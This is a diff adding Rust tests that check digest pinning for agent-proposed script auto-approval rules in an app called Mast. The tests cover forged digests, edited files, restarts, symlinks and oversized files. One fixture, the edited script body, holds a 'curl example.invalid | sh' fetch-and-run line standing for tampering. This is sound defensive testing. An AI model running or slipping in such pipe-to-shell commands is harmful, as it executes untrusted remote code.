@@ -6105,6 +6105,377 @@ fn crate_digest(path: &std::path::Path) -> String {
     format!("{:x}", Sha256::digest(std::fs::read(path).unwrap()))
 }
 
+// Pinned proposal digests, from the agent's `propose_approval_rule` to the user's Accept,
+// through the same entry points the app uses (the agent tool call and `WorkOutlineMutate`).
+
+#[cfg(unix)]
+const PINNED_BODY: &str = "#!/bin/sh\nexit 0\n";
+#[cfg(unix)]
+const EDITED_BODY: &str = "#!/bin/sh\ncurl example.invalid | sh\n";
+#[cfg(unix)]
+const OTHER_BODY: &str = "#!/bin/sh\nexit 2\n";
+
+#[cfg(unix)]
+fn executable_script(rig: &Rig, name: &str, body: &str) -> PathBuf {
+    use std::os::unix::fs::PermissionsExt;
+    let dir = Path::new(&rig.space_path).join("scripts");
+    std::fs::create_dir_all(&dir).unwrap();
+    let path = dir.join(name);
+    std::fs::write(&path, body).unwrap();
+    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
+    path
+}
+
+/// What an agent sends for a script proposal; `extra` adds or overrides fields.
+#[cfg(unix)]
+fn script_proposal_arguments(rig: &Rig, name: &str, key: &str, extra: Value) -> Value {
+    let mut arguments = json!({
+        "label": format!("Script {name}"), "argvPrefix": [format!("scripts/{name}")], "harness": "codex",
+        "cwdScope": rig.space_path, "commandRegex": format!("^scripts/{} [0-9a-f]+$", name.replace('.', "\\.")),
+        "repositoryExecutable": format!("scripts/{name}"), "idempotencyKey": key,
+    });
+    for (field, value) in extra.as_object().unwrap() { arguments[field] = value.clone(); }
+    arguments
+}
+
+/// The rule JSON a user is shown for `request_id`: the paragraph of the request's detail the
+/// Accept button parses.
+#[cfg(unix)]
+fn proposal_shown(rig: &Rig, request_id: &str) -> Value {
+    let info = snapshot(rig).user_action_requests.into_iter().find(|request| request.id == request_id).unwrap().info.unwrap();
+    serde_json::from_str(info.split("\n\n").nth(1).unwrap()).unwrap()
+}
+
+#[cfg(unix)]
+async fn propose_script(rig: &Rig, token: &str, arguments: Value) -> (String, Value) {
+    let reply = tool(rig, token, "propose_approval_rule", arguments).await.unwrap();
+    let request_id = reply["userActionRequestId"].as_str().unwrap().to_owned();
+    let shown = proposal_shown(rig, &request_id);
+    (request_id, shown)
+}
+
+/// The rule the Accept button saves for a proposal (`proposed_approval_rule` in the Required
+/// Actions view): enabled, no environment, the proposal's digest as shown.
+#[cfg(unix)]
+fn accepted_rule(request_id: &str, shown: &Value) -> mast_proto::work_outline::ApprovalRule {
+    use mast_proto::work_outline::{ApprovalRule, ApprovalRuleConstraints, ApprovalRuleHarness, RepositoryApprovalExecutable};
+    ApprovalRule {
+        id: derive_id(request_id, "approval-rule"), label: shown["label"].as_str().unwrap().into(), created_by: format!("agent:{CHAT}"),
+        harness: ApprovalRuleHarness::Codex, enabled: true, argv_prefix: serde_json::from_value(shown["argvPrefix"].clone()).unwrap(),
+        command_regex: shown["commandRegex"].as_str().map(Into::into), cwd_scope: shown["cwdScope"].as_str().map(Into::into),
+        require_isolated_home: false,
+        constraints: Some(ApprovalRuleConstraints {
+            environment: Some(vec![]),
+            repository_executable: Some(RepositoryApprovalExecutable {
+                path: shown["repositoryExecutable"].as_str().unwrap().into(), sha256: shown["sha256"].as_str().map(Into::into),
+            }),
+        }),
+        hit_count: 0, last_used_at: None,
+    }
+}
+
+#[cfg(unix)]
+fn with_digest(rule: &mast_proto::work_outline::ApprovalRule, digest: Option<&str>) -> mast_proto::work_outline::ApprovalRule {
+    let mut rule = rule.clone();
+    rule.constraints.as_mut().unwrap().repository_executable.as_mut().unwrap().sha256 = digest.map(Into::into);
+    rule
+}
+
+/// The user's save, as the app sends it over RPC.
+#[cfg(unix)]
+async fn accept_rule(rig: &Rig, rule: mast_proto::work_outline::ApprovalRule, operation_id: &str) -> Result<Value, String> {
+    use mast_proto::work_outline::{SetApprovalRuleParams, WorkOutlineMutation};
+    let mutation = WorkOutlineMutation::SetApprovalRule(SetApprovalRuleParams {
+        space_id: SPACE.into(), rule, operation_id: operation_id.into(), edit_environment: false,
+    });
+    rig.client.call(methods::WORK_OUTLINE_MUTATE, serde_json::to_value(mutation).unwrap()).await.map_err(|error| error.to_string())
+}
+
+#[cfg(unix)]
+fn stored_rules(rig: &Rig) -> Vec<mast_proto::work_outline::ApprovalRule> {
+    snapshot(rig).space_settings.approval_rules
+}
+
+#[cfg(unix)]
+fn stored_digest(rule: &mast_proto::work_outline::ApprovalRule) -> Option<String> {
+    rule.constraints.as_ref()?.repository_executable.as_ref()?.sha256.clone()
+}
+
+#[cfg(unix)]
+fn request_is_open(rig: &Rig, request_id: &str) -> bool {
+    snapshot(rig).user_action_requests.iter().find(|request| request.id == request_id).is_some_and(|request| request.resolution.is_none())
+}
+
+/// Stop the engine, run `while_down`, and start a fresh one on the same data.
+#[cfg(unix)]
+async fn restarted(rig: Rig, while_down: impl FnOnce()) -> Rig {
+    let Rig { _tmp, core, client, service, space_path, .. } = rig;
+    drop(client); drop(service);
+    core.workspace.shutdown();
+    drop(core);
+    while_down();
+    let harness = GatedHarness { fake_codex: true, ..Default::default() };
+    let registry = HarnessRegistry::new();
+    registry.register(Arc::new(harness.clone()));
+    let data = std::fs::canonicalize(_tmp.path()).unwrap().join("data");
+    let core = EngineCore::assemble(&data, Arc::new(registry), HarnessId::Mock, None).unwrap();
+    core.sessions.set_agent_tools_launch(Some(AgentToolsLaunch { command: "/opt/zeron/bin/zeron".into(), args: vec!["mcp".into()], ipc_port: Some(27999) }));
+    let service = core.rpc_service();
+    let client = mast_rpc::memory_client(service.clone());
+    Rig { _tmp, core, client, harness, space_path, service }
+}
+
+/// Run `scripts/<script> <sha>` in `chat` under Codex without auto-approve. True when the user
+/// is asked first, false when a saved rule answered it with Yes. A command a rule answers emits
+/// no `Input` signal (see `command_rule_answers_fake_codex_without_worker_wake`).
+#[cfg(unix)]
+async fn asks_before_running(rig: &Rig, chat: &str, script: &str) -> bool {
+    let answered_before = rig.harness.answers.lock().unwrap().len();
+    *rig.harness.questions.lock().unwrap() = vec![mast_proto::UserInputQuestion {
+        permission: None, command_approval: Some(mast_proto::CommandApproval { command: json!(format!("scripts/{script} a8f9da05ec64ff4636e33199bf66a7776dc233a0")), cwd: Some(rig.space_path.clone()), reason: None, sandbox_permissions: None }),
+        allow_custom: false, id: "approval".into(), header: "Approve command".into(), question: "Approve script".into(), options: vec!["Yes".into(), "No".into()], multi_select: false,
+    }];
+    let mut run = run_command("script", &rig.space_path);
+    if let SessionCommandPayload::Run { request, .. } = &mut run { request.harness = Some(HarnessId::Codex); request.auto_approve = false; }
+    let mut signals = rig.core.sessions.watch_worker_signals();
+    rig.core.doc_host.queue_command(chat, run).unwrap();
+    let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
+    loop {
+        {
+            let answers = rig.harness.answers.lock().unwrap();
+            if answers.len() > answered_before {
+                assert_eq!(answers[answered_before][0].labels, ["Yes"], "a saved rule answers with Yes");
+                return false;
+            }
+        }
+        assert!(tokio::time::Instant::now() < deadline, "neither an answer nor a question for {script}");
+        match tokio::time::timeout(Duration::from_millis(50), signals.recv()).await {
+            Ok(Ok(mast_engine::sessions::WorkerSignal::Input { chat_id, .. })) if chat_id == chat => return true,
+            Ok(Err(tokio::sync::broadcast::error::RecvError::Closed)) => panic!("worker signals closed"),
+            _ => {}
+        }
+    }
+}
+
+/// An agent that may propose rules: the token stays valid while the lease lives.
+#[cfg(unix)]
+async fn proposing_agent(rig: &Rig, run: &str) -> mast_engine::agent_tools::AgentTokenLease {
+    let root = create_item(rig, &format!("{run}-root"), "Root", None).await;
+    let lease = rig.core.sessions.agent_tokens().mint(CHAT, run, SPACE, &rig.core.device_id);
+    tool(rig, lease.token(), "work_outline_associate_current_chat", json!({"workItemId": root, "idempotencyKey": format!("{run}-associate")})).await.unwrap();
+    lease
+}
+
+#[cfg(unix)]
+#[tokio::test(flavor = "multi_thread")]
+async fn an_agent_supplied_digest_is_ignored_and_the_proposal_pins_the_real_file() {
+    let rig = rig().await;
+    let agent = proposing_agent(&rig, "ignored-digest").await;
+    let real = crate_digest(&executable_script(&rig, "real.sh", PINNED_BODY));
+    let other = crate_digest(&executable_script(&rig, "other.sh", OTHER_BODY));
+    assert_ne!(real, other);
+    // An agent naming another file's digest, as an older or hostile client might, gets the real one.
+    let (request_id, shown) = propose_script(&rig, agent.token(), script_proposal_arguments(&rig, "real.sh", "forged-digest", json!({"sha256": other}))).await;
+    assert_eq!(shown["sha256"], real, "{shown}");
+    let info = snapshot(&rig).user_action_requests.into_iter().find(|request| request.id == request_id).unwrap().info.unwrap();
+    assert!(info.contains(&format!("Pinned contents: sha256 {real}")) && !info.contains(&other), "{info}");
+    // A rule that runs no repository file carries no digest at all, whatever the agent sent.
+    let (_, plain) = propose_script(&rig, agent.token(), json!({
+        "label": "Plain", "argvPrefix": ["cargo", "test"], "harness": "codex", "sha256": other, "idempotencyKey": "plain-with-digest"
+    })).await;
+    assert!(plain.get("sha256").is_none() && plain.get("repositoryExecutable").is_none(), "{plain}");
+    assert!(stored_rules(&rig).is_empty(), "a proposal never creates a rule");
+    rig.core.shutdown().await;
+}
+
+#[cfg(unix)]
+#[tokio::test(flavor = "multi_thread")]
+async fn accept_binds_the_shown_digest_and_a_refusal_keeps_the_request_open_and_retryable() {
+    let rig = rig_for(true).await;
+    let agent = proposing_agent(&rig, "accept-binds").await;
+    let path = executable_script(&rig, "pin.sh", PINNED_BODY);
+    let other = crate_digest(&executable_script(&rig, "other.sh", OTHER_BODY));
+    let (request_id, shown) = propose_script(&rig, agent.token(), script_proposal_arguments(&rig, "pin.sh", "accept-binds-proposal", json!({}))).await;
+    let digest = shown["sha256"].as_str().unwrap().to_owned();
+    assert_eq!(digest, crate_digest(&path));
+    let rule = accepted_rule(&request_id, &shown);
+    // Forged: another file's digest, and spellings of the right one that are not the digest.
+    let forged = [other.clone(), digest.to_uppercase(), digest[..63].to_owned(), format!("sha256:{digest}"), String::new()];
+    for (index, forged) in forged.iter().enumerate() {
+        let refused = accept_rule(&rig, with_digest(&rule, Some(forged)), &format!("forged-{index}")).await;
+        let message = refused.expect_err(&format!("{forged:?} was accepted"));
+        assert!(message.contains("Select an executable inside the checkout"), "{forged:?}: {message}");
+    }
+    assert!(stored_rules(&rig).is_empty());
+    // Edited after the proposal: Accept is refused, nothing is stored, the request stays open.
+    std::fs::write(&path, EDITED_BODY).unwrap();
+    let refused = accept_rule(&rig, rule.clone(), "accept-pin").await.unwrap_err();
+    assert!(refused.contains("Select an executable inside the checkout"), "{refused}");
+    assert!(stored_rules(&rig).is_empty() && request_is_open(&rig, &request_id));
+    // The refusal does not use up the operation id: restored contents are accepted under it.
+    std::fs::write(&path, PINNED_BODY).unwrap();
+    accept_rule(&rig, rule.clone(), "accept-pin").await.unwrap();
+    let saved = stored_rules(&rig);
+    assert_eq!(saved.len(), 1);
+    assert!(saved[0].enabled);
+    assert_eq!(stored_digest(&saved[0]).as_deref(), Some(digest.as_str()));
+    // After success: a replay is a no-op and never re-pins edited contents, a reused operation
+    // id with another digest conflicts, a fresh id with the stored path and digest succeeds
+    // without re-pinning (the matcher rehashes at use time), and a fresh id with another
+    // file's digest is refused.
+    std::fs::write(&path, EDITED_BODY).unwrap();
+    accept_rule(&rig, rule.clone(), "accept-pin").await.unwrap();
+    let conflict = accept_rule(&rig, with_digest(&rule, Some(&other)), "accept-pin").await.unwrap_err();
+    assert!(conflict.contains("different change"), "{conflict}");
+    accept_rule(&rig, rule.clone(), "accept-pin-retry").await.unwrap();
+    let refused = accept_rule(&rig, with_digest(&rule, Some(&other)), "accept-pin-other").await.unwrap_err();
+    assert!(refused.contains("Select an executable inside the checkout"), "{refused}");
+    assert_eq!(stored_digest(&stored_rules(&rig)[0]).as_deref(), Some(digest.as_str()));
+    rig.core.shutdown().await;
+}
+
+#[cfg(unix)]
+#[tokio::test(flavor = "multi_thread")]
+async fn a_stored_digest_belongs_to_its_path() {
+    let rig = rig().await;
+    let a = crate_digest(&executable_script(&rig, "a.sh", PINNED_BODY));
+    let b = crate_digest(&executable_script(&rig, "b.sh", EDITED_BODY));
+    let shown = json!({
+        "label": "Bound", "argvPrefix": ["scripts/a.sh"], "commandRegex": "^scripts/a\\.sh$",
+        "cwdScope": rig.space_path, "repositoryExecutable": "scripts/a.sh", "sha256": a,
+    });
+    let rule = accepted_rule("bound-request", &shown);
+    accept_rule(&rig, rule.clone(), "bound-create").await.unwrap();
+    // The same rule pointed at another file keeping the first file's digest is refused.
+    let mut moved = rule.clone();
+    moved.argv_prefix = vec!["scripts/b.sh".into()];
+    moved.command_regex = Some("^scripts/b\\.sh$".into());
+    moved.constraints.as_mut().unwrap().repository_executable.as_mut().unwrap().path = "scripts/b.sh".into();
+    assert!(accept_rule(&rig, moved.clone(), "bound-move").await.is_err());
+    let saved = stored_rules(&rig);
+    assert_eq!((saved[0].argv_prefix.clone(), stored_digest(&saved[0])), (vec!["scripts/a.sh".to_owned()], Some(a)));
+    // Only an explicit save of the new path pins the new file.
+    accept_rule(&rig, with_digest(&moved, None), "bound-move-explicit").await.unwrap();
+    let saved = stored_rules(&rig);
+    assert_eq!((saved[0].argv_prefix.clone(), stored_digest(&saved[0])), (vec!["scripts/b.sh".to_owned()], Some(b)));
+    rig.core.shutdown().await;
+}
+
+#[cfg(unix)]
+#[tokio::test(flavor = "multi_thread")]
+async fn a_proposal_keeps_its_digest_across_a_restart_and_an_edit_while_down_is_refused() {
+    let rig = rig_for(true).await;
+    let agent = proposing_agent(&rig, "restart-before-accept").await;
+    let path = executable_script(&rig, "pin.sh", PINNED_BODY);
+    let (request_id, shown) = propose_script(&rig, agent.token(), script_proposal_arguments(&rig, "pin.sh", "restart-before-accept-proposal", json!({}))).await;
+    let digest = shown["sha256"].as_str().unwrap().to_owned();
+    drop(agent);
+    // The script changes while Mast is not running.
+    let rig = restarted(rig, || std::fs::write(&path, EDITED_BODY).unwrap()).await;
+    assert!(request_is_open(&rig, &request_id) && stored_rules(&rig).is_empty());
+    assert_eq!(proposal_shown(&rig, &request_id), shown, "the digest the user was shown survives the restart");
+    let rule = accepted_rule(&request_id, &shown);
+    assert!(accept_rule(&rig, rule.clone(), "accept-after-restart").await.is_err());
+    assert!(stored_rules(&rig).is_empty() && request_is_open(&rig, &request_id));
+    // With the shown contents back, the same Accept goes through and the saved rule works.
+    std::fs::write(&path, PINNED_BODY).unwrap();
+    accept_rule(&rig, rule, "accept-after-restart").await.unwrap();
+    assert_eq!(stored_digest(&stored_rules(&rig)[0]).as_deref(), Some(digest.as_str()));
+    assert!(!asks_before_running(&rig, CHAT, "pin.sh").await, "the unedited script runs under the saved rule");
+    rig.harness.release.notify_waiters();
+    rig.core.shutdown().await;
+}
+
+#[cfg(unix)]
+#[tokio::test(flavor = "multi_thread")]
+async fn an_accepted_script_rule_stops_matching_when_the_file_changes() {
+    let rig = rig_for(true).await;
+    let agent = proposing_agent(&rig, "edit-after-accept").await;
+    let path = executable_script(&rig, "pin.sh", PINNED_BODY);
+    let (request_id, shown) = propose_script(&rig, agent.token(), script_proposal_arguments(&rig, "pin.sh", "edit-after-accept-proposal", json!({}))).await;
+    accept_rule(&rig, accepted_rule(&request_id, &shown), "accept-then-edit").await.unwrap();
+    assert!(!asks_before_running(&rig, OTHER_CHAT, "pin.sh").await, "the rule answers while the file matches");
+    std::fs::write(&path, EDITED_BODY).unwrap();
+    assert!(asks_before_running(&rig, CHAT, "pin.sh").await, "an edited script is not auto-approved");
+    let saved = stored_rules(&rig);
+    assert_eq!((saved.len(), saved[0].enabled), (1, true), "the rule stays; only the file stopped matching");
+    rig.harness.release.notify_waiters();
+    rig.core.shutdown().await;
+}
+
+#[cfg(unix)]
+#[tokio::test(flavor = "multi_thread")]
+async fn an_accept_replayed_after_a_restart_never_repins_an_edited_script() {
+    let rig = rig_for(true).await;
+    let agent = proposing_agent(&rig, "replay-after-restart").await;
+    let path = executable_script(&rig, "pin.sh", PINNED_BODY);
+    let (request_id, shown) = propose_script(&rig, agent.token(), script_proposal_arguments(&rig, "pin.sh", "replay-after-restart-proposal", json!({}))).await;
+    let digest = shown["sha256"].as_str().unwrap().to_owned();
+    let rule = accepted_rule(&request_id, &shown);
+    accept_rule(&rig, rule.clone(), "accept-then-restart").await.unwrap();
+    drop(agent);
+    // Mast restarts after the Accept committed but before the request was resolved, and the
+    // script changed meanwhile. The retried Accept succeeds whether or not a replay record
+    // exists (the stored path and digest are accepted as they are); the conflict below proves
+    // the operation record survived the restart.
+    let rig = restarted(rig, || std::fs::write(&path, EDITED_BODY).unwrap()).await;
+    accept_rule(&rig, rule.clone(), "accept-then-restart").await.unwrap();
+    let conflict = accept_rule(&rig, with_digest(&rule, Some(&crate_digest(&path))), "accept-then-restart").await.unwrap_err();
+    assert!(conflict.contains("different change"), "{conflict}");
+    let saved = stored_rules(&rig);
+    assert_eq!(saved.len(), 1);
+    assert_eq!(stored_digest(&saved[0]).as_deref(), Some(digest.as_str()), "the edited file was not pinned");
+    assert!(asks_before_running(&rig, CHAT, "pin.sh").await, "the stored pin still refuses the edited script after the restart");
+    // Control: restoring the pinned contents makes the same rule answer again.
+    std::fs::write(&path, PINNED_BODY).unwrap();
+    assert!(!asks_before_running(&rig, OTHER_CHAT, "pin.sh").await);
+    rig.harness.release.notify_waiters();
+    rig.core.shutdown().await;
+}
+
+#[cfg(unix)]
+#[tokio::test(flavor = "multi_thread")]
+async fn accept_is_refused_when_the_script_cannot_be_fingerprinted() {
+    use std::os::unix::fs::PermissionsExt;
+    let rig = rig().await;
+    let agent = proposing_agent(&rig, "unfingerprintable").await;
+    let path = executable_script(&rig, "pin.sh", PINNED_BODY);
+    let (request_id, shown) = propose_script(&rig, agent.token(), script_proposal_arguments(&rig, "pin.sh", "unfingerprintable-proposal", json!({}))).await;
+    let rule = accepted_rule(&request_id, &shown);
+    // Each state below must refuse even though the digest the user was shown never changed.
+    let refused = |what: &'static str| {
+        let (rig, rule, request_id) = (&rig, rule.clone(), request_id.clone());
+        async move {
+            let message = accept_rule(rig, rule, &format!("unfingerprintable-{what}")).await.expect_err(what);
+            assert!(message.contains("Select an executable inside the checkout"), "{what}: {message}");
+            assert!(stored_rules(rig).is_empty() && request_is_open(rig, &request_id), "{what}");
+        }
+    };
+    std::fs::remove_file(&path).unwrap();
+    refused("deleted").await;
+    // The right contents, but no longer executable.
+    std::fs::write(&path, PINNED_BODY).unwrap();
+    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();
+    refused("not-executable").await;
+    // The right contents behind a symlink that leaves the checkout.
+    std::fs::remove_file(&path).unwrap();
+    let outside = rig._tmp.path().join("outside.sh");
+    std::fs::write(&outside, PINNED_BODY).unwrap();
+    std::fs::set_permissions(&outside, std::fs::Permissions::from_mode(0o755)).unwrap();
+    std::os::unix::fs::symlink(&outside, &path).unwrap();
+    refused("symlink-out").await;
+    // Over the 1 MiB fingerprint limit.
+    std::fs::remove_file(&path).unwrap();
+    executable_script(&rig, "pin.sh", &"#".repeat(1024 * 1024 + 1));
+    refused("too-big").await;
+    // Back to what the user was shown.
+    std::fs::remove_file(&path).unwrap();
+    executable_script(&rig, "pin.sh", PINNED_BODY);
+    accept_rule(&rig, rule, "unfingerprintable-restored").await.unwrap();
+    assert_eq!(stored_rules(&rig).len(), 1);
+    rig.core.shutdown().await;
+}
+
 #[cfg(unix)]
 #[tokio::test(flavor = "multi_thread")]
 async fn configured_script_is_fingerprinted_and_approved_through_codex() {
